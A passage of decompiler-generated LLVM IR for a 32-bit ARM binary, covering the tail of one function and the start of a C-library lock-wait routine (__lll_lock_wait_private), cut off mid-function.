  br i1 %v9_13fd8, label %dec_label_pc_13f70, label %dec_label_pc_13fd8.dec_label_pc_13fa4_crit_edge

dec_label_pc_13fd8.dec_label_pc_13fa4_crit_edge:  ; preds = %dec_label_pc_13fd8
  %v0_13fa4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13fa8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fa4

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13fe8.backedge, %entry
  %v0_13ffc31 = phi i32 [ ptrtoint (i32* @global_var_21d10.338 to i32), %entry ], [ %v0_13fe8, %dec_label_pc_13fe8.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ff8

dec_label_pc_13ff8.loopexit:                      ; preds = %bb72
  store i32 %v2_13f80, i32* %r6.global-to-local, align 4
  %v0_13ffc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13ff8

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13ff8.loopexit, %dec_label_pc_13ff4
  %v0_13ffc = phi i32 [ %v0_13ffc.pre, %dec_label_pc_13ff8.loopexit ], [ %v0_13ffc31, %dec_label_pc_13ff4 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13ffc = add i32 %v0_13ffc, 152
  %v3_13ffc = inttoptr i32 %v2_13ffc to i32*
  %v4_13ffc = load i32, i32* %v3_13ffc, align 4
  store i32 %v4_13ffc, i32* %r7.global-to-local, align 4
  %v0_14000 = call i32 @__aeabi_read_tp()
  store i32 %v0_14000, i32* %r0.global-to-local, align 4
  %v1_14004 = add i32 %v4_13ffc, 8
  %v2_14004 = inttoptr i32 %v1_14004 to i32*
  %v3_14004 = load i32, i32* %v2_14004, align 4
  store i32 %v3_14004, i32* %r3.global-to-local, align 4
  %v1_14008 = add i32 %v0_14000, -1168
  store i32 %v1_14008, i32* %r5.global-to-local, align 4
  %v3_1400c = icmp uge i32 %v3_14004, %v1_14008
  store i1 %v3_1400c, i1* %cpsr_c.global-to-local, align 1
  %v9_1400c = icmp eq i32 %v3_14004, %v1_14008
  br i1 %v9_1400c, label %dec_label_pc_14174, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_13ff8
  store i32 %v4_13ffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14020112 = inttoptr i32 %v4_13ffc to i32*
  %v2_14020113 = load i32, i32* %v1_14020112, align 4
  store i32 %v2_14020113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14024115 = icmp eq i32 %v2_14020113, 0
  br i1 %v9_14024115, label %dec_label_pc_1402c, label %dec_label_pc_14044

dec_label_pc_1402c:                               ; preds = %dec_label_pc_14014, %dec_label_pc_1402c.dec_label_pc_14020_crit_edge
  %v0_1402c116 = phi i32 [ %v1_14024.pre, %dec_label_pc_1402c.dec_label_pc_14020_crit_edge ], [ 0, %dec_label_pc_14014 ]
  store i32 %v0_1402c116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1403c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1403c, label %dec_label_pc_14040, label %dec_label_pc_1402c.dec_label_pc_14020_crit_edge

dec_label_pc_1402c.dec_label_pc_14020_crit_edge:  ; preds = %dec_label_pc_1402c
  %v0_14020.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14024.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14020 = inttoptr i32 %v0_14020.pre to i32*
  %v2_14020 = load i32, i32* %v1_14020, align 4
  store i32 %v2_14020, i32* %r3.global-to-local, align 4
  %v3_14024 = icmp uge i32 %v2_14020, %v1_14024.pre
  store i1 %v3_14024, i1* %cpsr_c.global-to-local, align 1
  %v9_14024 = icmp eq i32 %v2_14020, %v1_14024.pre
  br i1 %v9_14024, label %dec_label_pc_1402c, label %dec_label_pc_14044

dec_label_pc_14040:                               ; preds = %dec_label_pc_1402c
  %v0_14040 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14040, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %dec_label_pc_14014, %dec_label_pc_1402c.dec_label_pc_14020_crit_edge, %dec_label_pc_14040
  %v0_14044 = phi i32 [ %v0_14040, %dec_label_pc_14040 ], [ %v2_14020113, %dec_label_pc_14014 ], [ %v2_14020, %dec_label_pc_1402c.dec_label_pc_14020_crit_edge ]
  %v1_14044 = phi i32 [ %v0_14040, %dec_label_pc_14040 ], [ 0, %dec_label_pc_14014 ], [ %v1_14024.pre, %dec_label_pc_1402c.dec_label_pc_14020_crit_edge ]
  %v3_14044 = icmp uge i32 %v0_14044, %v1_14044
  store i1 %v3_14044, i1* %cpsr_c.global-to-local, align 1
  %v9_14044 = icmp eq i32 %v0_14044, %v1_14044
  br i1 %v9_14044, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_14044
  %v1_14048 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14048, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_14044, %bb73
  %v1_1404c = xor i1 %v9_14044, true
  call void @__pseudo_cond_branch(i1 %v1_1404c, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_14050 = load i32, i32* %r5.global-to-local, align 4
  %v1_14050 = load i32, i32* %r7.global-to-local, align 4
  %v2_14050 = add i32 %v1_14050, 8
  %v3_14050 = inttoptr i32 %v2_14050 to i32*
  store i32 %v0_14050, i32* %v3_14050, align 4
  br label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %bb74, %dec_label_pc_13ff8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_14058 = load i32, i32* %r8.global-to-local, align 4
  %v2_14058 = add i32 %v0_14058, 152
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  %v4_14058 = load i32, i32* %v3_14058, align 4
  store i32 %v4_14058, i32* %r2.global-to-local, align 4
  %v1_1405c = add i32 %v4_14058, 4
  %v2_1405c = inttoptr i32 %v1_1405c to i32*
  %v3_1405c = load i32, i32* %v2_1405c, align 4
  %v1_14060 = add i32 %v3_1405c, 1
  store i32 %v1_14060, i32* %r3.global-to-local, align 4
  store i32 %v1_14060, i32* %v2_1405c, align 4
  %v0_14068 = load i32, i32* %r5.global-to-local, align 4
  %v1_14068 = add i32 %v0_14068, 108
  %v2_14068 = inttoptr i32 %v1_14068 to i32*
  %v3_14068 = load i32, i32* %v2_14068, align 4
  store i32 %v3_14068, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_14070 = sub i32 0, %v3_14068
  store i32 %v1_14070, i32* %v2_14068, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_14084 = load i32, i32* %r5.global-to-local, align 4
  %v1_14084 = add i32 %v0_14084, 104
  store i32 %v1_14084, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_14178.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14178 = add i32 %v0_14084, 108
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  store i32 %v0_14178.pre, i32* %v3_14178, align 4
  %v0_1417c = load i32, i32* %r8.global-to-local, align 4
  %v1_1417c = load i32, i32* %r3.global-to-local, align 4
  %v2_1417c = add i32 %v1_1417c, %v0_1417c
  %v3_1417c = inttoptr i32 %v2_1417c to i32*
  %v4_1417c = load i32, i32* %v3_1417c, align 4
  store i32 %v4_1417c, i32* %r0.global-to-local, align 4
  %v1_14180 = add i32 %v4_1417c, 4
  %v2_14180 = inttoptr i32 %v1_14180 to i32*
  %v3_14180 = load i32, i32* %v2_14180, align 4
  %v1_14184 = add i32 %v3_14180, -1
  store i32 %v1_14184, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14188 = icmp eq i32 %v1_14184, 0
  store i32 %v1_14184, i32* %v2_14180, align 4
  br i1 %v2_14188, label %dec_label_pc_14194, label %dec_label_pc_14284thread-pre-split

dec_label_pc_14194:                               ; preds = %dec_label_pc_14174
  %v0_14194 = load i32, i32* %r3.global-to-local, align 4
  %v1_14194 = load i32, i32* %r0.global-to-local, align 4
  %v2_14194 = add i32 %v1_14194, 8
  %v3_14194 = inttoptr i32 %v2_14194 to i32*
  store i32 %v0_14194, i32* %v3_14194, align 4
  %v0_14198 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14198, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %dec_label_pc_141cc.dec_label_pc_1419c_crit_edge, %dec_label_pc_14194
  %v0_1419c = phi i32 [ %v0_1419c.pre, %dec_label_pc_141cc.dec_label_pc_1419c_crit_edge ], [ %v0_14198, %dec_label_pc_14194 ]
  %v1_1419c = inttoptr i32 %v0_1419c to i32*
  %v2_1419c = load i32, i32* %v1_1419c, align 4
  store i32 %v2_1419c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1419c, i32* %r2.global-to-local, align 4
  %v2_141a8100 = load i32, i32* %v1_1419c, align 4
  store i32 %v2_141a8100, i32* %r3.global-to-local, align 4
  %v3_141ac102 = icmp uge i32 %v2_141a8100, %v2_1419c
  store i1 %v3_141ac102, i1* %cpsr_c.global-to-local, align 1
  %v9_141ac108 = icmp eq i32 %v2_141a8100, %v2_1419c
  br i1 %v9_141ac108, label %dec_label_pc_141b4, label %dec_label_pc_141cc

dec_label_pc_141b4:                               ; preds = %dec_label_pc_1419c, %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge
  %v0_141b4109 = phi i32 [ %v1_141ac.pre, %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge ], [ %v2_1419c, %dec_label_pc_1419c ]
  store i32 %v0_141b4109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_141c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_141c4, label %dec_label_pc_141c8, label %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge

dec_label_pc_141b4.dec_label_pc_141a8_crit_edge:  ; preds = %dec_label_pc_141b4
  %v0_141a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_141ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_141a8 = inttoptr i32 %v0_141a8.pre to i32*
  %v2_141a8 = load i32, i32* %v1_141a8, align 4
  store i32 %v2_141a8, i32* %r3.global-to-local, align 4
  %v3_141ac = icmp uge i32 %v2_141a8, %v1_141ac.pre
  store i1 %v3_141ac, i1* %cpsr_c.global-to-local, align 1
  %v9_141ac = icmp eq i32 %v2_141a8, %v1_141ac.pre
  br i1 %v9_141ac, label %dec_label_pc_141b4, label %dec_label_pc_141cc

dec_label_pc_141c8:                               ; preds = %dec_label_pc_141b4
  %v0_141c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_141c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_1419c, %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge, %dec_label_pc_141c8
  %v0_141d4 = phi i32 [ %v0_141c8, %dec_label_pc_141c8 ], [ %v2_141a8100, %dec_label_pc_1419c ], [ %v2_141a8, %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge ]
  %v1_141cc = phi i32 [ %v0_141c8, %dec_label_pc_141c8 ], [ %v2_1419c, %dec_label_pc_1419c ], [ %v1_141ac.pre, %dec_label_pc_141b4.dec_label_pc_141a8_crit_edge ]
  %v3_141cc = icmp uge i32 %v0_141d4, %v1_141cc
  store i1 %v3_141cc, i1* %cpsr_c.global-to-local, align 1
  %v9_141cc = icmp eq i32 %v0_141d4, %v1_141cc
  br i1 %v9_141cc, label %dec_label_pc_141d4, label %dec_label_pc_141cc.dec_label_pc_1419c_crit_edge

dec_label_pc_141cc.dec_label_pc_1419c_crit_edge:  ; preds = %dec_label_pc_141cc
  %v0_1419c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_141d4:                               ; preds = %dec_label_pc_141cc
  %v2_141d4 = icmp ne i32 %v1_141cc, 0
  store i1 %v2_141d4, i1* %cpsr_c.global-to-local, align 1
  %v7_141d8 = icmp slt i32 %v1_141cc, 2
  br i1 %v7_141d8, label %dec_label_pc_14284thread-pre-split, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141d4
  %v0_141dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141dc, i32* %r0.global-to-local, align 4
  %v0_141e0 = load i32, i32* @r1, align 4
  %v1_141e0 = add i32 %v0_141e0, 129
  store i32 %v1_141e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14284thread-pre-split

dec_label_pc_141f8:                               ; preds = %dec_label_pc_14284thread-pre-split, %dec_label_pc_14280
  %v0_141f8 = phi i32 [ %v3_14280, %dec_label_pc_14280 ], [ %v0_14284.pr, %dec_label_pc_14284thread-pre-split ]
  %v1_141f8 = inttoptr i32 %v0_141f8 to i32*
  %v2_141f8 = load i32, i32* %v1_141f8, align 4
  store i32 %v2_141f8, i32* %r3.global-to-local, align 4
  %v1_141fc = add i32 %v2_141f8, 8
  %v2_141fc = inttoptr i32 %v1_141fc to i32*
  %v3_141fc = load i32, i32* %v2_141fc, align 4
  store i32 %v3_141fc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14200 = icmp eq i32 %v3_141fc, 0
  br i1 %v2_14200, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_141f8
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_141f8, %bb75
  %v2_14208 = xor i1 %v2_14200, true
  call void @__pseudo_cond_branch(i1 %v2_14208, i32 %v3_141fc)
  %v0_1420c = load i32, i32* %r6.global-to-local, align 4
  %v1_1420c = inttoptr i32 %v0_1420c to i32*
  %v2_1420c = load i32, i32* %v1_1420c, align 4
  store i32 %v2_1420c, i32* %r5.global-to-local, align 4
  %v1_14210 = add i32 %v2_1420c, 20
  store i32 %v1_14210, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14214

dec_label_pc_14214:                               ; preds = %dec_label_pc_14248.dec_label_pc_14214_crit_edge, %bb76
  %v0_14218 = phi i32 [ %v0_14218.pre, %dec_label_pc_14248.dec_label_pc_14214_crit_edge ], [ %v1_14210, %bb76 ]
  %v0_14214 = phi i32 [ %v0_14214.pre, %dec_label_pc_14248.dec_label_pc_14214_crit_edge ], [ %v2_1420c, %bb76 ]
  %v1_14214 = add i32 %v0_14214, 20
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  %v3_14214 = load i32, i32* %v2_14214, align 4
  store i32 %v0_14218, i32* %r2.global-to-local, align 4
  store i32 %v3_14214, i32* %r4.global-to-local, align 4
  %v1_14220 = add i32 %v3_14214, -1
  store i32 %v1_14220, i32* @r1, align 4
  %v1_1422487 = inttoptr i32 %v0_14218 to i32*
  %v2_1422488 = load i32, i32* %v1_1422487, align 4
  store i32 %v2_1422488, i32* %r3.global-to-local, align 4
  %v3_1422890 = icmp uge i32 %v2_1422488, %v3_14214
  store i1 %v3_1422890, i1* %cpsr_c.global-to-local, align 1
  %v9_1422896 = icmp eq i32 %v2_1422488, %v3_14214
  br i1 %v9_1422896, label %dec_label_pc_14230, label %dec_label_pc_14248

dec_label_pc_14230:                               ; preds = %dec_label_pc_14214, %dec_label_pc_14230.dec_label_pc_14224_crit_edge
  %v0_1423097 = phi i32 [ %v1_14228.pre, %dec_label_pc_14230.dec_label_pc_14224_crit_edge ], [ %v3_14214, %dec_label_pc_14214 ]
  store i32 %v0_1423097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14240 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14240, label %dec_label_pc_14244, label %dec_label_pc_14230.dec_label_pc_14224_crit_edge

dec_label_pc_14230.dec_label_pc_14224_crit_edge:  ; preds = %dec_label_pc_14230
  %v0_14224.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14228.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14224 = inttoptr i32 %v0_14224.pre to i32*
  %v2_14224 = load i32, i32* %v1_14224, align 4
  store i32 %v2_14224, i32* %r3.global-to-local, align 4
  %v3_14228 = icmp uge i32 %v2_14224, %v1_14228.pre
  store i1 %v3_14228, i1* %cpsr_c.global-to-local, align 1
  %v9_14228 = icmp eq i32 %v2_14224, %v1_14228.pre
  br i1 %v9_14228, label %dec_label_pc_14230, label %dec_label_pc_14248

dec_label_pc_14244:                               ; preds = %dec_label_pc_14230
  %v0_14244 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14244, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_14214, %dec_label_pc_14230.dec_label_pc_14224_crit_edge, %dec_label_pc_14244
  %v0_14254 = phi i32 [ %v0_14244, %dec_label_pc_14244 ], [ %v2_1422488, %dec_label_pc_14214 ], [ %v2_14224, %dec_label_pc_14230.dec_label_pc_14224_crit_edge ]
  %v1_14248 = phi i32 [ %v0_14244, %dec_label_pc_14244 ], [ %v3_14214, %dec_label_pc_14214 ], [ %v1_14228.pre, %dec_label_pc_14230.dec_label_pc_14224_crit_edge ]
  %v3_14248 = icmp uge i32 %v0_14254, %v1_14248
  store i1 %v3_14248, i1* %cpsr_c.global-to-local, align 1
  %v9_14248 = icmp eq i32 %v0_14254, %v1_14248
  store i32 %v0_14254, i32* %r2.global-to-local, align 4
  br i1 %v9_14248, label %dec_label_pc_14254, label %dec_label_pc_14248.dec_label_pc_14214_crit_edge

dec_label_pc_14248.dec_label_pc_14214_crit_edge:  ; preds = %dec_label_pc_14248
  %v0_14214.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_14218.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14214

dec_label_pc_14254:                               ; preds = %dec_label_pc_14248
  %v2_14254 = icmp ne i32 %v1_14248, 0
  store i1 %v2_14254, i1* %cpsr_c.global-to-local, align 1
  %v7_14254 = icmp eq i32 %v1_14248, 1
  %v0_1425c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_14254, label %dec_label_pc_1425c, label %dec_label_pc_14280

dec_label_pc_1425c:                               ; preds = %dec_label_pc_14254
  %v1_1425c = inttoptr i32 %v0_1425c to i32*
  %v2_1425c = load i32, i32* %v1_1425c, align 4
  store i32 %v2_1425c, i32* @r1, align 4
  %v1_14260 = add i32 %v2_1425c, 24
  %v2_14260 = inttoptr i32 %v1_14260 to i32*
  %v3_14260 = load i32, i32* %v2_14260, align 4
  store i32 %v3_14260, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14264 = icmp eq i32 %v3_14260, 0
  br i1 %v2_14264, label %dec_label_pc_14280, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_1425c
  %v1_1426c = add i32 %v2_1425c, 20
  %v2_1426c = inttoptr i32 %v1_1426c to i32*
  %v3_1426c = load i32, i32* %v2_1426c, align 4
  store i32 %v3_1426c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14254, %dec_label_pc_1426c, %dec_label_pc_1425c
  %v1_14280 = add i32 %v0_1425c, 4
  %v2_14280 = inttoptr i32 %v1_14280 to i32*
  %v3_14280 = load i32, i32* %v2_14280, align 4
  store i32 %v3_14280, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14284 = icmp eq i32 %v3_14280, 0
  br i1 %v2_14284, label %dec_label_pc_1428c, label %dec_label_pc_141f8

dec_label_pc_14284thread-pre-split:               ; preds = %dec_label_pc_141dc, %dec_label_pc_141d4, %dec_label_pc_14174
  %v0_14284.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1428411 = icmp eq i32 %v0_14284.pr, 0
  br i1 %v2_1428411, label %dec_label_pc_1428c, label %dec_label_pc_141f8

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14280, %dec_label_pc_14284thread-pre-split
  %v0_1428c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1428c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1428c.pre

; uselistorder directives
  uselistorder i32 %v0_14284.pr, { 1, 0 }
  uselistorder i32 %v3_14280, { 1, 2, 0 }
  uselistorder i32 %v1_14248, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14244, { 1, 0, 2 }
  uselistorder i32 %v1_14228.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_141c8, { 1, 0, 2 }
  uselistorder i32 %v1_141ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1419c, { 1, 0 }
  uselistorder i32 %v0_14040, { 1, 0, 2 }
  uselistorder i32 %v1_14024.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_13ffc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13fd4, { 1, 0, 2 }
  uselistorder i32 %v1_13fb8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_13f80, { 1, 0, 2 }
  uselistorder i32 %v0_13f60, { 1, 0, 2 }
  uselistorder i32 %v1_13f44.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 4, 5, 7, 6, 0, 8, 9, 10, 11, 13, 12, 1, 14, 15, 16, 17, 18, 19, 20, 22, 21, 2, 23, 24, 25, 27, 26, 3, 28, 29, 31, 30, 33, 32 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 12, 6, 7, 8, 10, 9, 2, 11, 13, 14, 16, 15, 3, 17, 18, 20, 19, 4, 21, 22, 24, 23, 5, 25, 26, 27, 28, 31, 32, 30, 29, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1428c, { 1, 0 }
  uselistorder label %dec_label_pc_14280, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14230, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_141cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_141b4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14044, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1402c, { 1, 0 }
  uselistorder label %dec_label_pc_13fd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fc0, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_13f64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f4c, { 1, 0 }
  uselistorder label %dec_label_pc_13fe8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13f18, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_142c4 = load i32, i32* @r4, align 4
  store i32 %v3_142c4, i32* %stack_var_-16, align 4
  %v0_142c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_142c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142cc

dec_label_pc_142cc:                               ; preds = %dec_label_pc_1434c.dec_label_pc_142cc_crit_edge, %entry
  %v0_142d0 = phi i32 [ %v0_142d0.pre, %dec_label_pc_1434c.dec_label_pc_142cc_crit_edge ], [ %v0_142c8, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_142d0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_142d817 = inttoptr i32 %v0_142d0 to i32*
  %v2_142d818 = load i32, i32* %v1_142d817, align 4
  %v3_142dc20 = icmp ne i32 %v2_142d818, 0
  store i1 %v3_142dc20, i1* %cpsr_c.global-to-local, align 1
  %v9_142dc26 = icmp eq i32 %v2_142d818, 1
  br i1 %v9_142dc26, label %dec_label_pc_142e4, label %dec_label_pc_142fc

dec_label_pc_142e4:                               ; preds = %dec_label_pc_142cc, %dec_label_pc_142e4.dec_label_pc_142d8_crit_edge
  %v0_142e427 = phi i32 [ %v1_142dc.pre, %dec_label_pc_142e4.dec_label_pc_142d8_crit_edge ], [ 1, %dec_label_pc_142cc ]
  store i32 %v0_142e427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_142f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_142f4, label %dec_label_pc_142f8, label %dec_label_pc_142e4.dec_label_pc_142d8_crit_edge

dec_label_pc_142e4.dec_label_pc_142d8_crit_edge:  ; preds = %dec_label_pc_142e4
  %v0_142d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_142dc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_142d8 = inttoptr i32 %v0_142d8.pre to i32*
  %v2_142d8 = load i32, i32* %v1_142d8, align 4
  %v3_142dc = icmp uge i32 %v2_142d8, %v1_142dc.pre
  store i1 %v3_142dc, i1* %cpsr_c.global-to-local, align 1
  %v9_142dc = icmp eq i32 %v2_142d8, %v1_142dc.pre
  br i1 %v9_142dc, label %dec_label_pc_142e4, label %dec_label_pc_142fc

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142e4
  %v0_142f8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142cc, %dec_label_pc_142e4.dec_label_pc_142d8_crit_edge, %dec_label_pc_142f8
  %v0_142fc = phi i32 [ %v0_142f8, %dec_label_pc_142f8 ], [ %v2_142d818, %dec_label_pc_142cc ], [ %v2_142d8, %dec_label_pc_142e4.dec_label_pc_142d8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_142fc = icmp eq i32 %v0_142fc, 0
  %v0_14320.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_142fc, label %dec_label_pc_1431c, label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %dec_label_pc_142fc
  store i32 %v0_14320.pre, i32* %r0.global-to-local, align 4
  %v0_14308 = load i32, i32* %r1.global-to-local, align 4
  %v1_14308 = add i32 %v0_14308, 126
  store i32 %v1_14308, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_14304
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14320.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1432828 = inttoptr i32 %v0_14320.pre to i32*
  %v2_1432829 = load i32, i32* %v1_1432828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1432c36 = icmp eq i32 %v2_1432829, 0
  br i1 %v9_1432c36, label %dec_label_pc_14334, label %dec_label_pc_1434c

dec_label_pc_14334:                               ; preds = %dec_label_pc_1431c, %dec_label_pc_14334.dec_label_pc_14328_crit_edge
  %v0_1433437 = phi i32 [ %v1_1432c.pre, %dec_label_pc_14334.dec_label_pc_14328_crit_edge ], [ 0, %dec_label_pc_1431c ]
  store i32 %v0_1433437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14344 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14344, label %dec_label_pc_14348, label %dec_label_pc_14334.dec_label_pc_14328_crit_edge

dec_label_pc_14334.dec_label_pc_14328_crit_edge:  ; preds = %dec_label_pc_14334
  %v0_14328.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1432c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14328 = inttoptr i32 %v0_14328.pre to i32*
  %v2_14328 = load i32, i32* %v1_14328, align 4
